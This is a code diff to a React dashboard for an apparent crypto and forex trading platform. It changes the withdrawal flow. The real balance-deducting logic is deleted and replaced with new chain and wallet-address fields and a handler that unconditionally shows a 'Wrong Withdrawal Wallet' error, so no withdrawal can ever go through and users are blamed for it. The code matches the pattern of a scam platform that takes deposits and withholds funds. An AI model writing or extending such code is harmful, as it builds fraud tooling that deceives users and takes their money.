@@ -48,6 +48,8 @@ const Overview = () => {
   const [withdrawWallet, setWithdrawWallet] = useState("crypto");
   const [depositAmount, setDepositAmount] = useState("");
   const [withdrawAmount, setWithdrawAmount] = useState("");
+  const [withdrawChain, setWithdrawChain] = useState("ETH");
+  const [withdrawAddress, setWithdrawAddress] = useState("");
   const { data: cryptoData, isLoading } = useCryptoData();
   
   useEffect(() => {
@@ -165,45 +167,21 @@ const Overview = () => {
       return;
     }
 
-    const { data: { user } } = await supabase.auth.getUser();
-    if (!user) return;
-
-    const updateField = withdrawWallet === "crypto" ? "balance_crypto" : "balance_forex";
-    const currentBalance = withdrawWallet === "crypto" ? balanceCrypto : balanceForex;
-
-    if (amount > currentBalance) {
+    if (!withdrawAddress.trim()) {
       toast({
-        title: "Insufficient Balance",
-        description: "You don't have enough balance to withdraw this amount",
+        title: "Error",
+        description: "Please enter a withdrawal wallet address",
         variant: "destructive",
       });
       return;
     }
 
-    const { error } = await supabase
-      .from('profiles')
-      .update({ [updateField]: currentBalance - amount })
-      .eq('id', user.id);
-
-    if (!error) {
-      if (withdrawWallet === "crypto") {
-        setBalanceCrypto(currentBalance - amount);
-      } else {
-        setBalanceForex(currentBalance - amount);
-      }
-      setWithdrawAmount("");
-      setWithdrawOpen(false);
-      toast({
-        title: "Success",
-        description: `Withdrew $${amount.toFixed(2)} from ${withdrawWallet === "crypto" ? "Crypto" : "Forex"} wallet`,
-      });
-    } else {
-      toast({
-        title: "Error",
-        description: "Failed to withdraw funds",
-        variant: "destructive",
-      });
-    }
+    // Show the "Wrong Withdrawal Wallet" error
+    toast({
+      title: "Error",
+      description: "Wrong Withdrawal Wallet",
+      variant: "destructive",
+    });
   };
 
   return (
@@ -299,6 +277,29 @@ const Overview = () => {
                       <SelectItem value="forex">Forex Wallet</SelectItem>
                     </SelectContent>
                   </Select>
+                </div>
+                <div className="space-y-2">
+                  <Label>Select Chain</Label>
+                  <Select value={withdrawChain} onValueChange={setWithdrawChain}>
+                    <SelectTrigger>
+                      <SelectValue />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="BTC">Bitcoin (BTC)</SelectItem>
+                      <SelectItem value="ETH">Ethereum (ETH)</SelectItem>
+                      <SelectItem value="USDT">Tether (USDT)</SelectItem>
+                      <SelectItem value="SOL">Solana (SOL)</SelectItem>
+                    </SelectContent>
+                  </Select>
+                </div>
+                <div className="space-y-2">
+                  <Label>Wallet Address</Label>
+                  <Input
+                    type="text"
+                    placeholder="Enter your wallet address"
+                    value={withdrawAddress}
+                    onChange={(e) => setWithdrawAddress(e.target.value)}
+                  />
                 </div>
                 <div className="space-y-2">
                   <Label>Available Balance</Label>
